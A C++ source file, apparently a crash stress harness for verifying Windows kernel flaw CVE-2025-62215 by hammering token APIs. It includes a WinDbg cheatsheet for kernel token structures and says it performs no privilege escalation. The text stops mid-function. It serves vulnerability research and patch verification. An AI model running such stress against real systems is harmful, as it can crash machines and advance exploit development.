// CVE-2025-62215 local verifier / crash stress harness.
//
// Suggested build:
//   cl /std:c++17 /EHsc /W4 /DUNICODE /D_UNICODE sol.cpp /link advapi32.lib
//
// This program is intentionally a non-LPE verifier. It does not steal tokens,
// write kernel memory, spawn elevated processes, inject code, or retain handles.

#if !defined(_M_X64)
#error This verifier must be built for x64.
#endif

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif

#include <windows.h>
#include <winternl.h>

#include <algorithm>
#include <atomic>
#include <cinttypes>
#include <cstdint>
#include <cstdlib>
#include <cwchar>
#include <functional>
#include <iomanip>
#include <iostream>
#include <map>
#include <mutex>
#include <random>
#include <sstream>
#include <string>
#include <thread>
#include <utility>
#include <vector>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_INVALID_INFO_CLASS
#define STATUS_INVALID_INFO_CLASS ((NTSTATUS)0xC0000003L)
#endif
#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif
#ifndef STATUS_ACCESS_VIOLATION
#define STATUS_ACCESS_VIOLATION ((NTSTATUS)0xC0000005L)
#endif
#ifndef STATUS_INVALID_HANDLE
#define STATUS_INVALID_HANDLE ((NTSTATUS)0xC0000008L)
#endif
#ifndef STATUS_INVALID_PARAMETER
#define STATUS_INVALID_PARAMETER ((NTSTATUS)0xC000000DL)
#endif
#ifndef STATUS_ACCESS_DENIED
#define STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)
#endif
#ifndef STATUS_BUFFER_TOO_SMALL
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#endif
#ifndef STATUS_OBJECT_TYPE_MISMATCH
#define STATUS_OBJECT_TYPE_MISMATCH ((NTSTATUS)0xC0000024L)
#endif
#ifndef STATUS_NO_SUCH_LOGON_SESSION
#define STATUS_NO_SUCH_LOGON_SESSION ((NTSTATUS)0xC000005FL)
#endif
#ifndef STATUS_PRIVILEGE_NOT_HELD
#define STATUS_PRIVILEGE_NOT_HELD ((NTSTATUS)0xC0000061L)
#endif
#ifndef STATUS_BAD_IMPERSONATION_LEVEL
#define STATUS_BAD_IMPERSONATION_LEVEL ((NTSTATUS)0xC00000A5L)
#endif
#ifndef STATUS_CANT_OPEN_ANONYMOUS
#define STATUS_CANT_OPEN_ANONYMOUS ((NTSTATUS)0xC00000A6L)
#endif
#ifndef STATUS_NOT_SUPPORTED
#define STATUS_NOT_SUPPORTED ((NTSTATUS)0xC00000BBL)
#endif
#ifndef STATUS_NOT_IMPLEMENTED
#define STATUS_NOT_IMPLEMENTED ((NTSTATUS)0xC0000002L)
#endif
#ifndef DISABLE_MAX_PRIVILEGE
#define DISABLE_MAX_PRIVILEGE 0x00000001UL
#endif
#ifndef PROCESS_QUERY_LIMITED_INFORMATION
#define PROCESS_QUERY_LIMITED_INFORMATION 0x00001000UL
#endif
#ifndef TOKEN_QUERY_SOURCE
#define TOKEN_QUERY_SOURCE 0x0010
#endif
#ifndef SECURITY_DYNAMIC_TRACKING
#define SECURITY_DYNAMIC_TRACKING TRUE
#endif
#ifndef SECURITY_MANDATORY_UNTRUSTED_RID
#define SECURITY_MANDATORY_UNTRUSTED_RID 0x00000000L
#endif
#ifndef SECURITY_MANDATORY_LOW_RID
#define SECURITY_MANDATORY_LOW_RID 0x00001000L
#endif
#ifndef SECURITY_MANDATORY_MEDIUM_RID
#define SECURITY_MANDATORY_MEDIUM_RID 0x00002000L
#endif
#ifndef SECURITY_MANDATORY_HIGH_RID
#define SECURITY_MANDATORY_HIGH_RID 0x00003000L
#endif
#ifndef SECURITY_MANDATORY_SYSTEM_RID
#define SECURITY_MANDATORY_SYSTEM_RID 0x00004000L
#endif
#ifndef SECURITY_MANDATORY_PROTECTED_PROCESS_RID
#define SECURITY_MANDATORY_PROTECTED_PROCESS_RID 0x00005000L
#endif
#ifndef SE_GROUP_INTEGRITY
#define SE_GROUP_INTEGRITY 0x00000020L
#endif

struct LocalTokenLinkedToken {
    HANDLE LinkedToken;
};

struct LocalTokenOrigin {
    LUID OriginatingLogonSession;
};

struct LocalTokenSource {
    CHAR SourceName[8];
    LUID SourceIdentifier;
};

struct LocalTokenMandatoryLabel {
    SID_AND_ATTRIBUTES Label;
};

struct LocalTokenMandatoryPolicy {
    DWORD Policy;
};

struct LocalTokenAppContainerInformation {
    PSID TokenAppContainer;
};

using NtQueryInformationToken_t = NTSTATUS(NTAPI *)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG, PULONG);
using NtSetInformationToken_t = NTSTATUS(NTAPI *)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG);
using NtDuplicateToken_t = NTSTATUS(NTAPI *)(HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, BOOLEAN, TOKEN_TYPE, PHANDLE);
using NtFilterToken_t = NTSTATUS(NTAPI *)(HANDLE, ULONG, PTOKEN_GROUPS, PTOKEN_PRIVILEGES, PTOKEN_GROUPS, PHANDLE);
using RtlQueryElevationFlags_t = NTSTATUS(NTAPI *)(PULONG);
using RtlNtStatusToDosError_t = ULONG(NTAPI *)(NTSTATUS);

struct unique_handle {
    unique_handle() noexcept = default;
    explicit unique_handle(HANDLE h) noexcept : h_(h) {}
    ~unique_handle() { reset(); }

    unique_handle(const unique_handle &) = delete;
    unique_handle &operator=(const unique_handle &) = delete;

    unique_handle(unique_handle &&other) noexcept : h_(other.release()) {}
    unique_handle &operator=(unique_handle &&other) noexcept {
        if (this != &other) {
            reset(other.release());
        }
        return *this;
    }

    HANDLE get() const noexcept { return h_; }
    explicit operator bool() const noexcept { return h_ != nullptr && h_ != INVALID_HANDLE_VALUE; }

    HANDLE release() noexcept {
        HANDLE out = h_;
        h_ = nullptr;
        return out;
    }

    void reset(HANDLE h = nullptr) noexcept {
        if (h_ != nullptr && h_ != INVALID_HANDLE_VALUE) {
            CloseHandle(h_);
        }
        h_ = h;
    }

private:
    HANDLE h_ = nullptr;
};

enum class Mode {
    Matrix,
    Stress,
    All
};

struct Config {
    Mode mode = Mode::All;
    DWORD threads = 8;
    DWORD seconds = 30;
    DWORD pid = 0;
    bool enable_set_probes = false;
    bool yes_local_vm = false;
    bool no_filter = false;
    bool no_duplicate = false;
    bool no_impersonate = false;
    bool no_query19 = false;
    bool no_query_shadow = false;
    bool print_kd_cheatsheet = false;
    bool help = false;
    bool parse_error = false;
};

struct NativeApis {
    NtQueryInformationToken_t NtQueryInformationToken = nullptr;
    NtSetInformationToken_t NtSetInformationToken = nullptr;
    NtDuplicateToken_t NtDuplicateToken = nullptr;
    NtFilterToken_t NtFilterToken = nullptr;
    RtlQueryElevationFlags_t RtlQueryElevationFlags = nullptr;
    RtlNtStatusToDosError_t RtlNtStatusToDosError = nullptr;
};

struct OpCounters {
    std::atomic<uint64_t> ok{0};
    std::atomic<uint64_t> fail{0};
};

struct Stats {
    OpCounters q19;
    OpCounters qshadow;
    OpCounters dup;
    OpCounters filter;
    OpCounters openclose;
    OpCounters targetchurn;
    OpCounters impersonate;
    OpCounters relation;
    std::atomic<uint64_t> total_ops{0};
    std::mutex status_mutex;
    std::map<NTSTATUS, uint64_t> statuses;
};

static std::mutex g_log_mutex;
static std::atomic<bool> g_stop{false};
static NativeApis g_nt;

std::string format_status(NTSTATUS st);

std::string narrow(const std::wstring &w) {
    if (w.empty()) {
        return std::string();
    }
    int needed = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), static_cast<int>(w.size()), nullptr, 0, nullptr, nullptr);
    if (needed <= 0) {
        return std::string("<conversion-error>");
    }
    std::string out(static_cast<size_t>(needed), '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), static_cast<int>(w.size()), &out[0], needed, nullptr, nullptr);
    return out;
}

std::string hex_u32(uint32_t value) {
    std::ostringstream oss;
    oss << "0x" << std::uppercase << std::hex << std::setw(8) << std::setfill('0') << value;
    return oss.str();
}

std::string hex_ptr(const void *p) {
    std::ostringstream oss;
    oss << "0x" << std::uppercase << std::hex << reinterpret_cast<uintptr_t>(p);
    return oss.str();
}

std::string utc_timestamp() {
    SYSTEMTIME st = {};
    GetSystemTime(&st);
    std::ostringstream oss;
    oss << std::setfill('0')
        << std::setw(4) << st.wYear << "-"
        << std::setw(2) << st.wMonth << "-"
        << std::setw(2) << st.wDay << "T"
        << std::setw(2) << st.wHour << ":"
        << std::setw(2) << st.wMinute << ":"
        << std::setw(2) << st.wSecond << "."
        << std::setw(3) << st.wMilliseconds << "Z";
    return oss.str();
}

void dbg_line(const std::string &line) {
    std::string s = "[sol.cpp] " + line + "\n";
    OutputDebugStringA(s.c_str());
}

void log_line(const std::string &line, bool dbg = false) {
    {
        std::lock_guard<std::mutex> lock(g_log_mutex);
        std::cout << line << std::endl;
    }
    if (dbg) {
        dbg_line(line);
    }
}

void kd_breadcrumb(const std::string &phase,
                   HANDLE h0 = nullptr,
                   HANDLE h1 = nullptr,
                   NTSTATUS st = STATUS_SUCCESS,
                   bool console = true) {
    std::ostringstream oss;
    oss << "[kd.ctx] utc=" << utc_timestamp()
        << " tick=" << GetTickCount64()
        << " pid=" << GetCurrentProcessId()
        << " tid=" << GetCurrentThreadId()
        << " phase=" << phase
        << " h0=" << hex_ptr(h0)
        << " h1=" << hex_ptr(h1)
        << " status=" << format_status(st);
    if (console) {
        log_line(oss.str(), true);
    } else {
        dbg_line(oss.str());
    }
}

std::string mode_to_string(Mode mode) {
    switch (mode) {
    case Mode::Matrix:
        return "matrix";
    case Mode::Stress:
        return "stress";
    case Mode::All:
    default:
        return "all";
    }
}

std::string yes_no(bool v) {
    return v ? "yes" : "no";
}

bool parse_dword(const wchar_t *s, DWORD *out) {
    if (s == nullptr || *s == L'\0' || out == nullptr) {
        return false;
    }
    if (s[0] == L'-') {
        return false;
    }
    wchar_t *end = nullptr;
    unsigned long v = wcstoul(s, &end, 0);
    if (end == s || *end != L'\0') {
        return false;
    }
    *out = static_cast<DWORD>(v);
    return true;
}

Config parse_args(int argc, wchar_t **argv) {
    Config cfg;
    for (int i = 1; i < argc; ++i) {
        std::wstring arg = argv[i];
        if (arg == L"--help" || arg == L"-h" || arg == L"/?") {
            cfg.help = true;
        } else if (arg == L"--mode" && i + 1 < argc) {
            std::wstring mode = argv[++i];
            if (mode == L"matrix") {
                cfg.mode = Mode::Matrix;
            } else if (mode == L"stress") {
                cfg.mode = Mode::Stress;
            } else if (mode == L"all") {
                cfg.mode = Mode::All;
            } else {
                log_line("[args] unknown --mode value: " + narrow(mode));
                cfg.parse_error = true;
            }
        } else if (arg == L"--threads" && i + 1 < argc) {
            DWORD v = 0;
            if (!parse_dword(argv[++i], &v) || v == 0) {
                log_line("[args] invalid --threads value");
                cfg.parse_error = true;
            } else {
                cfg.threads = std::min<DWORD>(v, 256);
            }
        } else if (arg == L"--seconds" && i + 1 < argc) {
            DWORD v = 0;
            if (!parse_dword(argv[++i], &v)) {
                log_line("[args] invalid --seconds value");
                cfg.parse_error = true;
            } else {
                cfg.seconds = v;
            }
        } else if (arg == L"--pid" && i + 1 < argc) {
            DWORD v = 0;
            if (!parse_dword(argv[++i], &v) || v == 0) {
                log_line("[args] invalid --pid value");
                cfg.parse_error = true;
            } else {
                cfg.pid = v;
            }
        } else if (arg == L"--enable-set-probes") {
            cfg.enable_set_probes = true;
        } else if (arg == L"--yes-local-vm") {
            cfg.yes_local_vm = true;
        } else if (arg == L"--no-filter") {
            cfg.no_filter = true;
        } else if (arg == L"--no-duplicate") {
            cfg.no_duplicate = true;
        } else if (arg == L"--no-impersonate") {
            cfg.no_impersonate = true;
        } else if (arg == L"--no-query19") {
            cfg.no_query19 = true;
        } else if (arg == L"--no-query-shadow") {
            cfg.no_query_shadow = true;
        } else if (arg == L"--print-kd-cheatsheet") {
            cfg.print_kd_cheatsheet = true;
        } else {
            log_line("[args] unknown argument: " + narrow(arg));
            cfg.parse_error = true;
        }
    }
    return cfg;
}

void print_help() {
    log_line("Usage: sol.exe [options]");
    log_line("  --mode matrix|stress|all       default: all");
    log_line("  --threads N                    default: 8");
    log_line("  --seconds N                    default: 30");
    log_line("  --pid PID                      optional target process token for read-only probes");
    log_line("  --enable-set-probes            allow NtSetInformationToken probes");
    log_line("  --yes-local-vm                 required with --enable-set-probes");
    log_line("  --no-filter                    disable NtFilterToken stress");
    log_line("  --no-duplicate                 disable NtDuplicateToken stress");
    log_line("  --no-impersonate               disable safe self-impersonation attach/revert churn");
    log_line("  --no-query19                   disable Query(19) stress");
    log_line("  --no-query-shadow              disable Query(-2) stress");
    log_line("  --print-kd-cheatsheet          print WinDbg commands and exit");
    log_line("  --help                         show this help");
}

void print_kd_cheatsheet() {
    log_line("========== KD / WinDbg Cheatsheet ==========");
    log_line("Session setup:");
    log_line("  .symfix");
    log_line("  .reload /f nt");
    log_line("  sxe av");
    log_line("  sxe gp");
    log_line("");
    log_line("Safe breakpoints:");
    log_line("  bp nt!NtQueryInformationToken");
    log_line("  bp nt!NtSetInformationToken");
    log_line("  bp nt!SepDuplicateToken");
    log_line("  bp nt!SepTokenDeleteMethod");
    log_line("  bp nt!SepDeReferenceLogonSession");
    log_line("");
    log_line("If public symbols are unavailable:");
    log_line("  Use your own nt base + RVA values from your local diff.");
    log_line("");
    log_line("Fields to inspect manually:");
    log_line("  _TOKEN.TokenFlags");
    log_line("  _TOKEN.LogonSession");
    log_line("  _SEP_LOGON_SESSION_REFERENCES.BuddyLogonId");
    log_line("  _SEP_LOGON_SESSION_REFERENCES.ReferenceCount");
    log_line("  _SEP_LOGON_SESSION_REFERENCES.Flags");
    log_line("  _SEP_LOGON_SESSION_REFERENCES.Token");
    log_line("");
    log_line("User-mode correlation:");
    log_line("  !process 0 1 sol.exe");
    log_line("  !handle 0 3 <sol_pid>");
    log_line("  .printf \"pid/tid from [kd.ctx] lines, then inspect matching thread/process state\"");
    log_line("  !thread");
    log_line("  !token");
    log_line("");
    log_line("This verifier does not read kernel addresses or perform exploit steps.");
    log_line("============================================");
}

bool resolve_one(HMODULE ntdll, const char *name, FARPROC *out, bool required) {
    *out = GetProcAddress(ntdll, name);
    if (*out != nullptr) {
        log_line(std::string("[api] ") + name + " resolved");
        return true;
    }
    if (required) {
        log_line(std::string("[api] ERROR missing required export: ") + name);
        return false;
    }
    log_line(std::string("[api] ") + name + " unavailable");
    return true;
}

bool resolve_ntdll(NativeApis *apis) {
    if (apis == nullptr) {
        return false;
    }
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll == nullptr) {
        log_line("[api] ERROR GetModuleHandleW(ntdll.dll) failed gle=" + std::to_string(GetLastError()));
        return false;
    }

    FARPROC p = nullptr;
    if (!resolve_one(ntdll, "NtQueryInformationToken", &p, true)) {
        return false;
    }
    apis->NtQueryInformationToken = reinterpret_cast<NtQueryInformationToken_t>(p);

    p = nullptr;
    if (!resolve_one(ntdll, "NtSetInformationToken", &p, true)) {
        return false;
    }
    apis->NtSetInformationToken = reinterpret_cast<NtSetInformationToken_t>(p);

    p = nullptr;
    if (!resolve_one(ntdll, "NtDuplicateToken", &p, true)) {
        return false;
    }
    apis->NtDuplicateToken = reinterpret_cast<NtDuplicateToken_t>(p);

    p = nullptr;
    if (!resolve_one(ntdll, "NtFilterToken", &p, true)) {
        return false;
    }
    apis->NtFilterToken = reinterpret_cast<NtFilterToken_t>(p);

    p = nullptr;
    resolve_one(ntdll, "RtlQueryElevationFlags", &p, false);
    apis->RtlQueryElevationFlags = reinterpret_cast<RtlQueryElevationFlags_t>(p);

    p = nullptr;
    resolve_one(ntdll, "RtlNtStatusToDosError", &p, false);
    apis->RtlNtStatusToDosError = reinterpret_cast<RtlNtStatusToDosError_t>(p);
    return true;
}

std::string ntstatus_name(NTSTATUS st) {
    switch (st) {
    case STATUS_SUCCESS:
        return "STATUS_SUCCESS";
    case STATUS_INVALID_INFO_CLASS:
        return "STATUS_INVALID_INFO_CLASS";
    case STATUS_INFO_LENGTH_MISMATCH:
        return "STATUS_INFO_LENGTH_MISMATCH";
    case STATUS_ACCESS_VIOLATION:
        return "STATUS_ACCESS_VIOLATION";
    case STATUS_INVALID_HANDLE:
        return "STATUS_INVALID_HANDLE";
    case STATUS_INVALID_PARAMETER:
        return "STATUS_INVALID_PARAMETER";
    case STATUS_NO_SUCH_LOGON_SESSION:
        return "STATUS_NO_SUCH_LOGON_SESSION";
    case STATUS_PRIVILEGE_NOT_HELD:
        return "STATUS_PRIVILEGE_NOT_HELD";
    case STATUS_ACCESS_DENIED:
        return "STATUS_ACCESS_DENIED";
    case STATUS_BUFFER_TOO_SMALL:
        return "STATUS_BUFFER_TOO_SMALL";
    case STATUS_OBJECT_TYPE_MISMATCH:
        return "STATUS_OBJECT_TYPE_MISMATCH";
    case STATUS_NOT_IMPLEMENTED:
        return "STATUS_NOT_IMPLEMENTED";
    case STATUS_NOT_SUPPORTED:
        return "STATUS_NOT_SUPPORTED";
    case STATUS_BAD_IMPERSONATION_LEVEL:
        return "STATUS_BAD_IMPERSONATION_LEVEL";
    case STATUS_CANT_OPEN_ANONYMOUS:
        return "STATUS_CANT_OPEN_ANONYMOUS";
    default:
        return "STATUS_UNKNOWN";
    }
}

std::string format_status(NTSTATUS st) {
    std::string name = ntstatus_name(st);
    std::ostringstream oss;
    oss << name << "(" << hex_u32(static_cast<uint32_t>(st)) << ")";
    if (name == "STATUS_UNKNOWN" && g_nt.RtlNtStatusToDosError != nullptr) {
        ULONG dos = g_nt.RtlNtStatusToDosError(st);
        oss << "/dos=" << dos;
    }
    return oss.str();
}

bool is_common_gate_status(NTSTATUS st) {
    switch (st) {
    case STATUS_SUCCESS:
    case STATUS_INVALID_INFO_CLASS:
    case STATUS_INFO_LENGTH_MISMATCH:
    case STATUS_INVALID_PARAMETER:
    case STATUS_NO_SUCH_LOGON_SESSION:
    case STATUS_PRIVILEGE_NOT_HELD:
    case STATUS_ACCESS_DENIED:
    case STATUS_BUFFER_TOO_SMALL:
    case STATUS_OBJECT_TYPE_MISMATCH:
    case STATUS_NOT_IMPLEMENTED:
    case STATUS_NOT_SUPPORTED:
    case STATUS_BAD_IMPERSONATION_LEVEL:
    case STATUS_CANT_OPEN_ANONYMOUS:
        return true;
    default:
        return false;
    }
}

void record_status(Stats *stats, NTSTATUS st) {
    if (stats == nullptr) {
        return;
    }
    std::lock_guard<std::mutex> lock(stats->status_mutex);
    ++stats->statuses[st];
}

void record_op(OpCounters *counter, bool ok) {
    if (counter == nullptr) {
        return;
    }
    if (ok) {
        counter->ok.fetch_add(1, std::memory_order_relaxed);
    } else {
        counter->fail.fetch_add(1, std::memory_order_relaxed);
    }
}

std::string luid_to_string(const LUID &luid) {
    std::ostringstream oss;
    oss << "0x" << std::uppercase << std::hex << static_cast<uint32_t>(luid.HighPart)
        << ":" << std::setw(8) << std::setfill('0') << static_cast<uint32_t>(luid.LowPart);
    return oss.str();
}

std::string token_type_to_string(TOKEN_TYPE type) {
    switch (type) {
    case TokenPrimary:
        return "TokenPrimary";
    case TokenImpersonation:
        return "TokenImpersonation";
    default:
        return "TokenType(" + std::to_string(static_cast<int>(type)) + ")";
    }
}

std::string elevation_type_to_string(TOKEN_ELEVATION_TYPE type) {
    switch (type) {
    case TokenElevationTypeDefault:
        return "Default";
    case TokenElevationTypeFull:
        return "Full";
    case TokenElevationTypeLimited:
        return "Limited";
    default:
        return "ElevationType(" + std::to_string(static_cast<int>(type)) + ")";
    }
}

std::string impersonation_level_to_string(SECURITY_IMPERSONATION_LEVEL level) {
    switch (level) {
    case SecurityAnonymous:
        return "Anonymous";
    case SecurityIdentification:
        return "Identification";
    case SecurityImpersonation:
        return "Impersonation";
    case SecurityDelegation:
        return "Delegation";
    default:
        return "Level(" + std::to_string(static_cast<int>(level)) + ")";
    }
}

std::string sid_summary(PSID sid) {
    if (sid == nullptr) {
        return "sid=null";
    }
    if (!IsValidSid(sid)) {
        return "sid=invalid";
    }
    UCHAR count = *GetSidSubAuthorityCount(sid);
    DWORD last_rid = count > 0 ? *GetSidSubAuthority(sid, static_cast<DWORD>(count - 1)) : 0;
    SID_IDENTIFIER_AUTHORITY *auth = GetSidIdentifierAuthority(sid);
    std::ostringstream oss;
    oss << "subauths=" << static_cast<unsigned int>(count)
        << " last_rid=" << hex_u32(last_rid)
        << " authority=";
    for (int i = 0; i < 6; ++i) {
        oss << std::uppercase << std::hex << std::setw(2) << std::setfill('0') << static_cast<unsigned int>(auth->Value[i]);
    }
    return oss.str();
}

std::string integrity_rid_to_string(DWORD rid) {
    if (rid < SECURITY_MANDATORY_LOW_RID) {
        return "Untrusted";
    }
    if (rid < SECURITY_MANDATORY_MEDIUM_RID) {
        return "Low";
    }
    if (rid < SECURITY_MANDATORY_HIGH_RID) {
        return "Medium";
    }
    if (rid < SECURITY_MANDATORY_SYSTEM_RID) {
        return "High";
    }
    if (rid < SECURITY_MANDATORY_PROTECTED_PROCESS_RID) {
        return "System";
    }
    return "ProtectedProcessOrAbove";
}

bool get_token_info_fixed(HANDLE token, TOKEN_INFORMATION_CLASS cls, void *buf, DWORD cb, DWORD *ret = nullptr) {
    DWORD local_ret = 0;
    BOOL ok = GetTokenInformation(token, cls, buf, cb, &local_ret);
    if (ret != nullptr) {
        *ret = local_ret;
    }
    return ok != FALSE;
}

void inspect_token_basic(HANDLE token, const std::string &label, bool verbose = true) {
    if (token == nullptr || token == INVALID_HANDLE_VALUE) {
        log_line(label + " token=null");
        return;
    }

    TOKEN_TYPE type = TokenPrimary;
    DWORD ret = 0;
    bool has_type = get_token_info_fixed(token, TokenType, &type, sizeof(type), &ret);
    DWORD type_gle = has_type ? ERROR_SUCCESS : GetLastError();

    TOKEN_ELEVATION_TYPE etype = TokenElevationTypeDefault;
    bool has_etype = get_token_info_fixed(token, TokenElevationType, &etype, sizeof(etype), &ret);
    DWORD etype_gle = has_etype ? ERROR_SUCCESS : GetLastError();

    TOKEN_ELEVATION elevation = {};
    bool has_elevation = get_token_info_fixed(token, TokenElevation, &elevation, sizeof(elevation), &ret);
    DWORD elevation_gle = has_elevation ? ERROR_SUCCESS : GetLastError();

    TOKEN_STATISTICS stats = {};
    bool has_stats = get_token_info_fixed(token, TokenStatistics, &stats, sizeof(stats), &ret);
    DWORD stats_gle = has_stats ? ERROR_SUCCESS : GetLastError();

    std::ostringstream oss;
    oss << label;
    if (has_type) {
        oss << " type=" << token_type_to_string(type);
    } else {
        oss << " type_gle=" << type_gle;
    }
    if (has_etype) {
        oss << " elevation_type=" << elevation_type_to_string(etype);
    } else {
        oss << " elevation_type_gle=" << etype_gle;
    }
    if (has_elevation) {
        oss << " elevated=" << (elevation.TokenIsElevated ? "yes" : "no");
    } else {
        oss << " elevation_gle=" << elevation_gle;
    }
    if (has_stats) {
        oss << " auth=" << luid_to_string(stats.AuthenticationId)
            << " token_id=" << luid_to_string(stats.TokenId)
            << " modified=" << luid_to_string(stats.ModifiedId);
    } else {
        oss << " stats_gle=" << stats_gle;
    }
    if (verbose) {
        log_line(oss.str());
    } else {
        dbg_line(oss.str());
    }
}

void inspect_linked_token_win32(HANDLE token) {
    LocalTokenLinkedToken linked = {};
    DWORD ret = 0;
    if (GetTokenInformation(token, static_cast<TOKEN_INFORMATION_CLASS>(19), &linked, sizeof(linked), &ret)) {
        unique_handle linked_handle(linked.LinkedToken);
        log_line("[token] GetTokenInformation(TokenLinkedToken=19) succeeded handle=" + hex_ptr(linked_handle.get()), true);
        inspect_token_basic(linked_handle.get(), "[token.linked]", true);
    } else {
        log_line("[token] GetTokenInformation(TokenLinkedToken=19) failed gle=" + std::to_string(GetLastError()) +
                 " retLen=" + std::to_string(ret));
    }
}

bool get_token_info_variable(HANDLE token, TOKEN_INFORMATION_CLASS cls, std::vector<BYTE> *buf, DWORD *gle_out = nullptr, DWORD *ret_out = nullptr) {
    if (buf == nullptr) {
        return false;
    }
    DWORD needed = 0;
    SetLastError(ERROR_SUCCESS);
    GetTokenInformation(token, cls, nullptr, 0, &needed);
    DWORD first_gle = GetLastError();
    if (needed == 0) {
        if (gle_out != nullptr) {
            *gle_out = first_gle;
        }
        if (ret_out != nullptr) {
            *ret_out = 0;
        }
        return false;
    }

    buf->assign(needed, 0);
    SetLastError(ERROR_SUCCESS);
    BOOL ok = GetTokenInformation(token, cls, buf->data(), needed, &needed);
    DWORD gle = ok ? ERROR_SUCCESS : GetLastError();
    if (gle_out != nullptr) {
        *gle_out = gle;
    }
    if (ret_out != nullptr) {
        *ret_out = needed;
    }
    return ok != FALSE;
}

void log_token_dword_info(HANDLE token, TOKEN_INFORMATION_CLASS cls, const std::string &label) {
    DWORD value = 0;
    DWORD ret = 0;
    SetLastError(ERROR_SUCCESS);
    bool ok = get_token_info_fixed(token, cls, &value, sizeof(value), &ret);
    DWORD gle = ok ? ERROR_SUCCESS : GetLastError();
    std::ostringstream oss;
    oss << label << " ok=" << yes_no(ok) << " value=" << value << " gle=" << gle << " retLen=" << ret;
    log_line(oss.str());
}

void log_token_source_info(HANDLE token, const std::string &label) {
    LocalTokenSource source = {};
    DWORD ret = 0;
    SetLastError(ERROR_SUCCESS);
    bool ok = get_token_info_fixed(token, static_cast<TOKEN_INFORMATION_CLASS>(7), &source, sizeof(source), &ret);
    DWORD gle = ok ? ERROR_SUCCESS : GetLastError();

    std::string name;
    for (size_t i = 0; i < sizeof(source.SourceName); ++i) {
        if (source.SourceName[i] == '\0') {
            break;
        }
        name.push_back(source.SourceName[i]);
    }

    std::ostringstream oss;
    oss << label << " ok=" << yes_no(ok)
        << " source=" << (name.empty() ? "<empty>" : name)
        << " source_id=" << luid_to_string(source.SourceIdentifier)
        << " gle=" << gle
        << " retLen=" << ret;
    log_line(oss.str());
}

void log_token_origin_info(HANDLE token, const std::string &label) {
    LocalTokenOrigin origin = {};
    DWORD ret = 0;
    SetLastError(ERROR_SUCCESS);
    bool ok = get_token_info_fixed(token, static_cast<TOKEN_INFORMATION_CLASS>(17), &origin, sizeof(origin), &ret);
    DWORD gle = ok ? ERROR_SUCCESS : GetLastError();
    std::ostringstream oss;
    oss << label << " ok=" << yes_no(ok)
        << " origin_logon=" << luid_to_string(origin.OriginatingLogonSession)
        << " gle=" << gle
        << " retLen=" << ret;
    log_line(oss.str());
}

void log_token_user_like_info(HANDLE token, TOKEN_INFORMATION_CLASS cls, const std::string &label) {
    std::vector<BYTE> buf;
    DWORD gle = 0;
    DWORD ret = 0;
    bool ok = get_token_info_variable(token, cls, &buf, &gle, &ret);
    std::ostringstream oss;
    oss << label << " ok=" << yes_no(ok) << " gle=" << gle << " retLen=" << ret;
    if (ok && !buf.empty()) {
        const TOKEN_USER *user = reinterpret_cast<const TOKEN_USER *>(buf.data());
        oss << " " << sid_summary(user->User.Sid)
            << " attrs=" << hex_u32(user->User.Attributes);
    }
    log_line(oss.str());
}

void log_token_owner_info(HANDLE token, const std::string &label) {
    std::vector<BYTE> buf;
    DWORD gle = 0;
    DWORD ret = 0;
    bool ok = get_token_info_variable(token, static_cast<TOKEN_INFORMATION_CLASS>(4), &buf, &gle, &ret);
    std::ostringstream oss;
    oss << label << " ok=" << yes_no(ok) << " gle=" << gle << " retLen=" << ret;
    if (ok && !buf.empty()) {
        const TOKEN_OWNER *owner = reinterpret_cast<const TOKEN_OWNER *>(buf.data());
        oss << " " << sid_summary(owner->Owner);
    }
    log_line(oss.str());
}

void log_token_groups_info(HANDLE token, TOKEN_INFORMATION_CLASS cls, const std::string &label) {
    std::vector<BYTE> buf;
    DWORD gle = 0;
    DWORD ret = 0;
    bool ok = get_token_info_variable(token, cls, &buf, &gle, &ret);
    std::ostringstream oss;
    oss << label << " ok=" << yes_no(ok) << " gle=" << gle << " retLen=" << ret;
    if (ok && !buf.empty()) {
        const TOKEN_GROUPS *groups = reinterpret_cast<const TOKEN_GROUPS *>(buf.data());
        DWORD enabled = 0;
        DWORD deny_only = 0;
        DWORD integrity = 0;
        for (DWORD i = 0; i < groups->GroupCount; ++i) {
            DWORD attrs = groups->Groups[i].Attributes;
            if ((attrs & SE_GROUP_ENABLED) != 0) {
                ++enabled;
            }
            if ((attrs & SE_GROUP_USE_FOR_DENY_ONLY) != 0) {
                ++deny_only;
            }
            if ((attrs & SE_GROUP_INTEGRITY) != 0) {
                ++integrity;
            }
        }
        oss << " count=" << groups->GroupCount
            << " enabled=" << enabled
            << " deny_only=" << deny_only
            << " integrity_groups=" << integrity;
        if (groups->GroupCount > 0) {
            oss << " first={" << sid_summary(groups->Groups[0].Sid)
                << " attrs=" << hex_u32(groups->Groups[0].Attributes) << "}";
        }
    }
    log_line(oss.str());
}

void log_token_integrity_info(HANDLE token, const std::string &label) {
    std::vector<BYTE> buf;
    DWORD gle = 0;
    DWORD ret = 0;
    bool ok = get_token_info_variable(token, static_cast<TOKEN_INFORMATION_CLASS>(25), &buf, &gle, &ret);
    std::ostringstream oss;
    oss << label << " ok=" << yes_no(ok) << " gle=" << gle << " retLen=" << ret;
    if (ok && !buf.empty()) {
        const LocalTokenMandatoryLabel *mandatory = reinterpret_cast<const LocalTokenMandatoryLabel *>(buf.data());
        DWORD rid = 0;
        if (mandatory->Label.Sid != nullptr && IsValidSid(mandatory->Label.Sid)) {
            UCHAR count = *GetSidSubAuthorityCount(mandatory->Label.Sid);
            if (count > 0) {
                rid = *GetSidSubAuthority(mandatory->Label.Sid, static_cast<DWORD>(count - 1));
            }
        }
        oss << " rid=" << hex_u32(rid)
            << " level=" << integrity_rid_to_string(rid)
